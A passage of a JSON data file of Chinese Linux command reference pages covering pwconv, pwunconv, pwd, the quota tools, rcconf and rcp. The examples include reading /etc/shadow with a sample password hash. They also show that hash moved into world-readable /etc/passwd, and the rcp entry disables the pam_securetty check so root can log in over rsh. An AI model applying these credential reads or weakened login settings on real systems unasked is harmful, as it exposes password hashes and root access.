<span class=\"hljs-keyword\">not</span> exist<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'list'</span>: directory <span class=\"hljs-string\">'/var/list'</span> does <span class=\"hljs-keyword\">not</span> exist<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'irc'</span>: directory <span class=\"hljs-string\">'/var/run/ircd'</span> does <span class=\"hljs-keyword\">not</span> exist<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'gnats'</span>: directory <span class=\"hljs-string\">'/var/lib/gnats'</span> does <span class=\"hljs-keyword\">not</span> exist<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'nobody'</span>: directory <span class=\"hljs-string\">'/nonexistent'</span> does <span class=\"hljs-keyword\">not</span> exist<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'syslog'</span>: directory <span class=\"hljs-string\">'/home/syslog'</span> does <span class=\"hljs-keyword\">not</span> exist<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'couchdb'</span>: directory <span class=\"hljs-string\">'/var/lib/couchdb'</span> does <span class=\"hljs-keyword\">not</span> exist<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'speech-dispatcher'</span>: directory <span class=\"hljs-string\">'/var/run/speech-dispatcher'</span> does <span class=\"hljs-keyword\">not</span> exist<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'usbmux'</span>: directory <span class=\"hljs-string\">'/home/usbmux'</span> does <span class=\"hljs-keyword\">not</span> exist<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'haldaemon'</span>: directory <span class=\"hljs-string\">'/var/run/hald'</span> does <span class=\"hljs-keyword\">not</span> exist<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'pulse'</span>: directory <span class=\"hljs-string\">'/var/run/pulse'</span> does <span class=\"hljs-keyword\">not</span> exist<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'saned'</span>: directory <span class=\"hljs-string\">'/home/saned'</span> does <span class=\"hljs-keyword\">not</span> exist<span class=\"hljs-built_in\">\nuser </span><span class=\"hljs-string\">'hplip'</span>: directory <span class=\"hljs-string\">'/var/run/hplip'</span> does <span class=\"hljs-keyword\">not</span> exist\npwck：无改变\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pwconv",
        "des": "用来开启用户的投影密码",
        "body": "<h1 id=\"pwconv\">pwconv</h1>\n<p>用来开启用户的投影密码</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pwconv命令</strong> 用来开启用户的投影密码。Linux系统里的用户和群组密码，分别存放在名称为passwd和group的文件中， 这两个文件位于<code>/etc</code>目录下。因系统运作所需，任何人都得以读取它们，造成安全上的破绽。投影密码将文件内的密码改存在<code>/etc</code>目录下的shadow和gshadow文件内，只允许系统管理者读取，同时把原密码置换为\"x\"字符，有效的强化了系统的安全性。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">pwconv</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">cat <span class=\"hljs-regexp\">/etc/</span>passwd | <span class=\"hljs-keyword\">grep</span> test\ntest:x:<span class=\"hljs-number\">3001</span>:<span class=\"hljs-number\">3001</span>::<span class=\"hljs-regexp\">/home/</span>test:<span class=\"hljs-regexp\">/bin/</span>sh\n</code></pre>\n<p>此时可以发现密码段是x</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">cat</span> /etc/shadow | grep test\n<span class=\"hljs-attribute\">test</span>:$<span class=\"hljs-number\">6</span>$nYOEWamm$bz07nlv/.RgJufb3FAqJJeULfwybzgxmrWqbk7O4vI0KsT6N.ujrh6dDIUcAJdfjksyuyAFDPIngZeD3cgcf.<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">15022</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pwd",
        "des": "显示当前工作目录的绝对路径。",
        "body": "<h1 id=\"pwd\">pwd</h1>\n<p>显示当前工作目录的绝对路径。</p>\n<h2 id=\"目录\">目录</h2>\n<ul>\n<li><a href=\"#%E5%86%85%E5%BB%BA%E5%91%BD%E4%BB%A4\">bash内建命令</a></li>\n<li><a href=\"#%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4\">GNU coreutils中的命令</a></li>\n</ul>\n<h2 id=\"内建命令\">内建命令</h2>\n<h4 id=\"概要\">概要</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">pwd</span><span class=\"hljs-meta\"> [-LP]</span>\n</code></pre>\n<h4 id=\"主要用途\">主要用途</h4>\n<ul>\n<li>显示当前工作目录。</li>\n</ul>\n<h4 id=\"选项\">选项</h4>\n<pre><code class=\"language-shell\">-L （默认值）打印环境变量<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$PWD</span>\"</span>的值，可能为符号链接。\n-P 打印当前工作目录的物理位置。\n</code></pre>\n<h4 id=\"返回值\">返回值</h4>\n<p>返回状态为成功除非给出了非法选项或是当前目录无法读取。</p>\n<h4 id=\"注意\">注意</h4>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<h2 id=\"外部命令\">外部命令</h2>\n<h4 id=\"概要-1\">概要</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">pwd</span> [OPTION]<span class=\"hljs-string\">...</span>\n</code></pre>\n<h4 id=\"主要用途-1\">主要用途</h4>\n<ul>\n<li>显示当前工作目录。</li>\n</ul>\n<h4 id=\"选项-1\">选项</h4>\n<pre><code class=\"language-shell\">-<span class=\"hljs-string\">L</span>, <span class=\"hljs-built_in\">--logical</span> 打印环境变量<span class=\"hljs-string\">\"$PWD\"</span>的值，可能为符号链接。\n-<span class=\"hljs-string\">P</span>, <span class=\"hljs-built_in\">--physical</span> （默认值）打印当前工作目录的物理位置。\n<span class=\"hljs-built_in\">--help</span> 显示帮助信息并退出。\n<span class=\"hljs-built_in\">--version</span> 显示版本信息并退出。\n</code></pre>\n<h4 id=\"返回值-1\">返回值</h4>\n<p>返回状态为成功除非给出了非法选项或是当前目录无法读取。</p>\n<h4 id=\"注意-1\">注意</h4>\n<ol>\n<li><p>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man pwd</code>或<code>info coreutils 'pwd invocation'</code>。</p>\n</li>\n<li><p>启动或关闭内建命令请查看<code>enable</code>命令，关于同名优先级的问题请查看<code>builtin</code>命令的例子部分的相关讨论。</p>\n</li>\n<li><p>在不禁用内建且当前环境没有定义<code>pwd</code>函数的情况下，使用<code>/usr/bin/pwd</code>指向<code>coreutils</code>的<code>pwd</code>，使用<code>pwd</code>指向bash内建的<code>pwd</code>。</p>\n</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "pwunconv",
        "des": "用来关闭用户的投影密码",
        "body": "<h1 id=\"pwunconv\">pwunconv</h1>\n<p>用来关闭用户的投影密码</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pwunconv命令</strong> 与pwconv功能相反，用来关闭用户的投影密码。它会把密码从shadow文件内，重回存到passwd文件里。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">pwunconv</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">pwunconv     <span class=\"hljs-comment\"># 关闭影子密码</span>\ncat <span class=\"hljs-regexp\">/etc/</span>passwd | grep test     <span class=\"hljs-comment\"># 发现密码已经在passwd文件中了</span>\ntest:<span class=\"hljs-variable\">$6</span><span class=\"hljs-variable\">$nYOEWamm</span><span class=\"hljs-variable\">$bz07nlv</span><span class=\"hljs-regexp\">/.RgJufb3FAqJJeULfwybzgxmrWqbk7O4vI0KsT6N.ujrh6dDIUcAJdfjksyuyAFDPIngZeD3cgcf.0:3001:3001::/</span>home<span class=\"hljs-regexp\">/test:/</span>bin/sh\n\nls <span class=\"hljs-regexp\">/etc/</span>shadow     <span class=\"hljs-comment\"># 查看影子文件，提示没有这个文件或目录</span>\nls: cannot access <span class=\"hljs-regexp\">/etc/</span>shadow: No such file or directory\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "quota",
        "des": "显示磁盘已使用的空间与限制",
        "body": "<h1 id=\"quota\">quota</h1>\n<p>显示磁盘已使用的空间与限制</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>quota命令</strong> 用于显示用户或者工作组的磁盘配额信息。输出信息包括磁盘使用和配额限制。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">quota</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-g：列出群组的磁盘空间限制；</span>\n<span class=\"hljs-deletion\">-q：简明列表，只列出超过限制的部分；</span>\n<span class=\"hljs-deletion\">-u：列出用户的磁盘空间限制；</span>\n<span class=\"hljs-deletion\">-v：显示该用户或群组，在所有挂入系统的存储设备的空间限制；</span>\n<span class=\"hljs-deletion\">-V：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>用户或者工作组：指定要显示的用户或者工作组。</p>\n<h3 id=\"实例\">实例</h3>\n<p>我们可以限制某一群组所能使用的最大磁盘配额，而且可以再限制某一使用者的最大磁盘配额 ，好比做一个收费的应用，vip可以得到空间更大一些。另外，以 Link 的方式，来使邮件可以作为限制的配额（更改<code>/var/spool/mail</code> 这个路径），不2，需要重新再规划一个硬盘！直接使用 Link 的方式指向 /home （或者其它已经做好的 quota 磁盘）就可以！这通常是用在原本规划不好，但是却又不想要更动原有主机架构的情况中！</p>\n<p>要求：Linux 主机里面主要针对 quser1 及 quser2 两个使用者来进行磁盘配额， 且这两个使用者都是挂在 qgroup 组里面的。每个使用者总共有 50MB 的磁盘空间 (不考虑 inode) 限制！并且 soft limit 为 45 MB；而宽限时间设定为 1 天， 但是在一天之内必须要将多余的文件删除掉，否则将无法使用剩下的空间 ；gquota 这个组考虑最大限额，所以设定为 90 MB！（注意，这样设置的好处是富有弹性，好比现在的邮件服务，那么多用户，承诺给用户每人最大空间为数GB，然而人们不可能每人都会使用那么大的空间，所以邮件服务的总空间，实际上肯定不是注册客户数乘以数GB，否则这样得多大啊。）</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># groupadd qgroup</span>\n[root@localhost ~]<span class=\"hljs-comment\"># useradd -m -g qgroup quser1</span>\n[root@localhost ~]<span class=\"hljs-comment\"># useradd -m -g qgroup quser2</span>\n[root@localhost ~]<span class=\"hljs-comment\"># passwd quser1</span>\n[root@localhost ~]<span class=\"hljs-comment\"># passwd quser2</span>\n[root@localhost ~]<span class=\"hljs-comment\"># df     ===&gt;  自己找一个合适的分区来做实验，这里用/disk2</span>\nFilesystem             <span class=\"hljs-number\">1</span>K-blocks        Used      Available   Use% Mounted on\n<span class=\"hljs-regexp\">/dev/</span>hda1              <span class=\"hljs-number\">5952252</span>   <span class=\"hljs-number\">3193292</span>     <span class=\"hljs-number\">2451720</span>     <span class=\"hljs-number\">57</span>%     /\n<span class=\"hljs-regexp\">/dev/</span>hdb1            <span class=\"hljs-number\">28267608</span>       <span class=\"hljs-number\">77904</span>   <span class=\"hljs-number\">26730604</span>       <span class=\"hljs-number\">1</span>%     /disk2\n<span class=\"hljs-regexp\">/dev/</span>hda5              <span class=\"hljs-number\">9492644</span>     <span class=\"hljs-number\">227252</span>     <span class=\"hljs-number\">8775412</span>       <span class=\"hljs-number\">3</span>%     /disk1\n\n[root@localhost ~]<span class=\"hljs-comment\"># vi /etc/fstab</span>\nLABEL=<span class=\"hljs-regexp\">/             /</span>                ext3      defaults                                     <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">1</span>\nLABEL=<span class=\"hljs-regexp\">/disk1    /</span>disk1        ext3      defaults                                      <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">2</span>\nLABEL=<span class=\"hljs-regexp\">/disk2    /</span>disk2        ext3      defaults,usrquota,grpquota       <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">2</span>  \n<span class=\"hljs-regexp\">/dev/</span>hda3         swap         swap     defaults                                     <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span>\n</code></pre>\n<p>注意多了<code>usrquota,grpquota</code>，在<code>defaults,usrquota,grpquota</code>之间都没有空格，务必正确书写。这样就算加入了 quota 的磁盘格式了！不过，由于真正的 quota 在读取的时候是读取<code>/etc/mtab</code>这个文件的，而该文件需要重新开机之后才能够以/etc/fstab 的新数据进行改写！所以这个时候可以选择：重新开机 (reboot)。</p>\n<p>重新<code>remount filesystem</code>来驱动设定值。</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# umount <span class=\"hljs-regexp\">/dev/</span>hdb1\n[root@localhost ~]# mount -a\n[root@localhost ~]# <span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">'/disk2'</span> <span class=\"hljs-regexp\">/etc/m</span>tab\n<span class=\"hljs-regexp\">/dev/</span>hdb1 /disk2 ext3 rw,usrquota,grpquota <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span>\n</code></pre>\n<p>事实上，也可以利用 mount 的 remount 功能。</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># mount -o remount /disk2</span>\n</code></pre>\n<p>这样就已经成功的将 filesystem 的 quota 功能加入。</p>\n<p>扫瞄磁盘的使用者使用状况，并产生重要的 aquota.group 与 aquota.user：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># quotacheck -avug</span>\nquotacheck: Scanning /dev/hdb1 [/disk2] done\nquotacheck: Checked<span class=\"hljs-number\"> 3 </span>directories and<span class=\"hljs-number\"> 4 </span>files\n\n[root@localhost ~]<span class=\"hljs-comment\"># ll /disk2</span>\n-rw------- <span class=\"hljs-number\"> 1 </span>root root <span class=\"hljs-number\"> 6144 </span>Sep <span class=\"hljs-number\"> 6 </span>11:44 aquota.group\n-rw------- <span class=\"hljs-number\"> 1 </span>root root <span class=\"hljs-number\"> 6144 </span>Sep <span class=\"hljs-number\"> 6 </span>11:44 aquota.user\n</code></pre>\n<p>使用 quotacheck 就可以轻易的将所需要的数据给他输出了！但奇怪的是，在某些 Linux 版本中，不能够以 aquota.user(group) 来启动quota ，可能是因为旧版 quota 的关系， 所以就另外做了一个 link 文件按来欺骗 quota，这个动作非必要。（主要是学习这个思维很重要）</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># cd /disk2</span>\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># ln -s aquota.user quota.user</span>\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># ln -s aquota.group quota.group</span>\n</code></pre>\n<p>启动 quota 的限额：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># quotaon -avug</span>\n/dev/hdb1 [/disk2]: <span class=\"hljs-keyword\">group</span> <span class=\"hljs-title\">quotas</span> turned on\n/dev/hdb1 [/disk2]: <span class=\"hljs-keyword\">user</span> <span class=\"hljs-title\">quotas</span> turned on    ===&gt;  看到turned on，才是真的成功！\n</code></pre>\n<p>编辑使用者的可使用空间：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># edquota -u quser1</span>\nDisk quotas for user quser1 (uid 502):\n  Filesystem    blocks    soft    hard   inodes   soft   hard\n  /dev/hdb1          <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 45000 </span>  <span class=\"hljs-number\"> 50000 </span>       <span class=\"hljs-number\"> 0 </span>    <span class=\"hljs-number\"> 0 </span>     0\n[root@localhost ~]<span class=\"hljs-comment\"># edquota -p quser1 quser2      ===&gt;  直接复制给quser2</span>\n</code></pre>\n<p>接下来要来设定宽限时间，还是使用 edquota</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# edquota -<span class=\"hljs-built_in\">t</span>\nGrace period before enforcing soft limits for use<span class=\"hljs-symbol\">rs:</span>\n<span class=\"hljs-built_in\">time</span> units may <span class=\"hljs-symbol\">be:</span> <span class=\"hljs-built_in\">days</span>, hours, minutes, <span class=\"hljs-built_in\">or</span> seconds\n  Filesystem             Block grace period     Inode grace period\n  /dev/hdb1                     <span class=\"hljs-number\">1</span><span class=\"hljs-built_in\">days</span>                  <span class=\"hljs-number\">7</span><span class=\"hljs-built_in\">days</span>\n</code></pre>\n<p>使用<code>quota -v</code>来查询：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># quota -vu quser1 quser2</span>\nDisk quotas for user quser1 (uid 502):\n     Filesystem  blocks   quota      limit   grace   files   quota   limit   grace\n      /dev/hdb1        <span class=\"hljs-number\"> 0 </span>  <span class=\"hljs-number\"> 45000 </span>  <span class=\"hljs-number\"> 50000 </span>                 <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>      0\nDisk quotas for user quser2 (uid 503):\n     Filesystem  blocks   quota      limit   grace   files   quota   limit   grace\n      /dev/hdb1        <span class=\"hljs-number\"> 0 </span>  <span class=\"hljs-number\"> 45000 </span>  <span class=\"hljs-number\"> 50000 </span>                 <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>      0\n</code></pre>\n<p>注意，由于使用者尚未超过45 MB，所以 grace ( 宽限时间 ) 就不会出现。</p>\n<p>编辑群组可使用的空间：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># edquota -g qgroup</span>\nDisk quotas for group qgroup (gid 502):\n  Filesystem     blocks       soft       hard    inodes   soft   hard\n  /dev/hdb1           <span class=\"hljs-number\"> 0 </span>    <span class=\"hljs-number\"> 80000 </span> <span class=\"hljs-number\"> 90000 </span>         <span class=\"hljs-number\"> 0 </span>    <span class=\"hljs-number\"> 0 </span>     0\n\n[root@localhost ~]<span class=\"hljs-comment\"># quota -vg qgroup</span>\nDisk quotas for group qgroup (gid 502):\n     Filesystem   blocks    quota      limit      grace    files   quota   limit   grace\n      /dev/hdb1        <span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 80000 </span> <span class=\"hljs-number\"> 90000 </span>                     <span class=\"hljs-number\"> 0 </span>      <span class=\"hljs-number\"> 0 </span>       0\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "quotacheck",
        "des": "检查磁盘的使用空间与限制",
        "body": "<h1 id=\"quotacheck\">quotacheck</h1>\n<p>检查磁盘的使用空间与限制</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>quotacheck命令</strong> 通过扫描指定的文件系统，获取磁盘的使用情况，创建、检查和修复磁盘配额（quota）文件。执行quotacheck指令，扫描挂入系统的分区，并在各分区的文件系统根目录下产生quota.user和quota.group文件，设置用户和群组的磁盘空间限制。</p>\n<p>如果在执行quotacheck命令时出现了以下信息：</p>\n<pre><code class=\"language-shell\">quotacheck: Your kernel probably supports journaled quota <span class=\"hljs-keyword\">but</span> you are <span class=\"hljs-keyword\">not</span> using <span class=\"hljs-keyword\">it</span>. Consider switching <span class=\"hljs-keyword\">to</span> journaled quota <span class=\"hljs-keyword\">to</span> avoid <span class=\"hljs-built_in\">running</span> quotacheck <span class=\"hljs-keyword\">after</span> an unclean shutdown. \n</code></pre>\n<p>可以考虑将之前在文件系统的配置文件中添加的quota相关字段修改为：<code>usrjquota=aquota.user,grpjquota=aquota.group,jqfmt=vfsv1</code>，然后重新挂载文件系统：<code>mount -vo remount 挂载目录</code>（注意，如果这一步操作出现了任何问题，千万不要试图通过重启解决！将配置文件恢复原状是一个好的选择）</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">quotacheck</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：扫描在/etc/fstab文件里，有加入quota设置的分区；</span>\n<span class=\"hljs-deletion\">-c：对目标文件系统进行一次新的扫描，并创建新的quota文件；</span>\n<span class=\"hljs-deletion\">-d：详细显示指令执行过程，便于排错或了解程序执行的情形；</span>\n<span class=\"hljs-deletion\">-g：扫描磁盘空间时，计算每个群组识别码所占用的目录和文件数目；</span>\n<span class=\"hljs-deletion\">-R：排除根目录所在的分区；</span>\n<span class=\"hljs-deletion\">-u：扫描磁盘空间时，计算每个用户识别码所占用的目录和文件数目；</span>\n<span class=\"hljs-deletion\">-v：显示指令执行过程。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件系统：指定要扫描的文件系统。</p>\n<h3 id=\"实例\">实例</h3>\n<p>将所有的在<code>/etc/mtab</code>内，含有quota支持的partition进行扫描：</p>\n<pre><code class=\"language-shell\">[root@linux ~]<span class=\"hljs-meta\"># quotacheck -avug</span>\n<span class=\"hljs-symbol\">quotacheck:</span> Scanning <span class=\"hljs-keyword\">/dev/</span>hdb1 [/disk2] done\n<span class=\"hljs-symbol\">quotacheck:</span> Checked <span class=\"hljs-number\">3</span> directories and <span class=\"hljs-number\">4</span> files\n</code></pre>\n<p>强制扫描已挂载的filesystem：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@linux</span> ~]<span class=\"hljs-meta\"># quotacheck -avug -m</span>\n</code></pre>\n<p>扫描指定的filesystem：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@linux</span> ~]<span class=\"hljs-meta\"># quotacheck -cvug /disk2</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "quotaoff",
        "des": "关闭Linux内核中指定文件系统的磁盘配额功能",
        "body": "<h1 id=\"quotaoff\">quotaoff</h1>\n<p>关闭Linux内核中指定文件系统的磁盘配额功能</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>quotaoff命令</strong> 用于关闭Linux内核中指定文件系统的磁盘配额功能。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">quotaoff</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：关闭在/etc/fstab文件里，有加入quota设置的分区的空间限制；</span>\n<span class=\"hljs-deletion\">-g：关闭群组的磁盘空间限制；</span>\n<span class=\"hljs-deletion\">-u：关闭用户的磁盘空间限制；</span>\n<span class=\"hljs-deletion\">-v：显示指令执行过程。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件系统：指定要关闭磁盘配额功能的文件系统。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "quotaon",
        "des": "激活Linux内核中指定文件系统的磁盘配额功能",
        "body": "<h1 id=\"quotaon\">quotaon</h1>\n<p>激活Linux内核中指定文件系统的磁盘配额功能</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>quotaon命令</strong> 执行quotaon指令可开启磁盘对用户和群组的空间使用限制，但在开启前，各分区的文件系统根目录必须存在通过quotacheck命令创建的quota配置文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">quotaon</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：开启在/ect/fstab文件里，有加入quota设置的分区的空间限制；</span>\n<span class=\"hljs-deletion\">-g：开启群组的磁盘空间限制；</span>\n<span class=\"hljs-deletion\">-u：开启用户的磁盘空间限制；</span>\n<span class=\"hljs-deletion\">-v：显示指令指令执行过程。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件系统：指定要激活磁盘配额功能的文件系统。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "rcconf",
        "des": "Debian Linux下的运行等级服务配置工具",
        "body": "<h1 id=\"rcconf\">rcconf</h1>\n<p>Debian Linux下的运行等级服务配置工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rcconf命令</strong> 是Debian Linux下的运行等级服务配置工具，用以设置在特定的运行等级下系统服务的启动配置。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rcconf</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--help：打印帮助信息；</span>\n<span class=\"hljs-comment\">--dialog：使用对话命令显示菜单；</span>\n<span class=\"hljs-comment\">--notermcheck：不按照终端属性来设置窗口尺寸。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "rcp",
        "des": "使在两台Linux主机之间的文件复制操作更简单",
        "body": "<h1 id=\"rcp\">rcp</h1>\n<p>使在两台Linux主机之间的文件复制操作更简单</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rcp命令</strong> 使在两台Linux主机之间的文件复制操作更简单。通过适当的配置，在两台Linux主机之间复制文件而无需输入密码，就像本地文件复制一样简单。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rcp</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-p：保留源文件或目录的属性，包括拥有者、所属群组、权限与时间；</span>\n<span class=\"hljs-deletion\">-r：递归处理，将指定目录下的文件与子目录一并处理；</span>\n<span class=\"hljs-deletion\">-x：加密两台Linux主机间传送的所有信息。</span>\n<span class=\"hljs-deletion\">-D：指定远程服务器的端口号。</span>\n</code></pre>\n<p>同名用户的主目录。如果没有给出远程用户名，就使用当前用户名。如果远程机上的路径包含特殊shell字符，需要用反斜线<code>\\\\</code>、双引号<code>\"\"</code>或单引号<code>''</code>括起来，使所有的shell元字符都能被远程地解释。需要说明的是，rcp不提示输入口令，它通过rsh命令来执行拷贝。</p>\n<p>directory&nbsp;每个文件或目录参数既可以是远程文件名也可以是本地文件名。远程文件名具有如下形式<code>rname@rhost:path</code>，其中rname是远程用户名，rhost是远程计算机名，path是这个文件的路径。</p>\n<h3 id=\"参数\">参数</h3>\n<p>源文件：指定要复制的源文件。源文件可以有多个。</p>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>rcp命令使用条件</strong> </p>\n<p>如果系统中有<code>/etc/hosts</code>文件，系统管理员应确保该文件包含要与之进行通信的远程主机的项。配置过程:</p>\n<p>只对root用户生效</p>\n<p>1、在双方root用户根目录下建立rhosts文件，并将双方的hostname加进去。在此之前应在双方的<code>/etc/hosts</code>文件中加入对方的ip和hostname<br>2、把rsh服务启动起来，redhat默认是不启动的。<br>方法：用执行ntsysv命令，在rsh选项前用空格键选中，确定退出。然后执行<code>service&nbsp;xinetd&nbsp;restart</code>即可。<br>3、到<code>/etc/pam.d/</code>目录下，把rsh文件中的<code>auth&nbsp;required&nbsp;/lib/security/pam_securetty.so</code>一行用“#”注释掉即可。（只有注释掉这一行，才能用root用户登录）</p>\n<p> <strong>将当前目录下的&nbsp;test1&nbsp;复制到名为&nbsp;webserver1 的远程系统：</strong> </p>\n<pre><code class=\"language-shell\">rcp test1 webserver1:<span class=\"hljs-regexp\">/home/</span>root/test3\n</code></pre>\n<p>在这种情况下，test1&nbsp;被复制到远程子目录&nbsp;test3下，名称仍为&nbsp;test1&nbsp;。如果仅提供了远程主机名，rcp&nbsp;将把&nbsp;test1&nbsp;复制到远程主目录下，名称仍为&nbsp;test1&nbsp;。</p>\n<p> <strong>还可以在目的目录中包含文件名。例如，将文件复制到名为&nbsp;webserver1的系统中：</strong> </p>\n<pre><code class=\"language-shell\">rcp test1 webserver1:<span class=\"hljs-regexp\">/home/</span>root/test3\n</code></pre>\n<p>在这种情况下，将&nbsp;test1&nbsp;复制到远程目录root&nbsp;下并将其命名为&nbsp;test3。</p>\n<p> <strong>从远程系统复制文件：要将远程系统中的文件复制到本地目录下：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">rcp</span> remote_hostname:remote_file local_fileEnter\n</code></pre>\n<p> <strong>将远程系统&nbsp;webserver1中的&nbsp;test2&nbsp;复制到当前目录：</strong> </p>\n<pre><code class=\"language-shell\">rcp webserver1:<span class=\"hljs-regexp\">/home/</span>root/test2 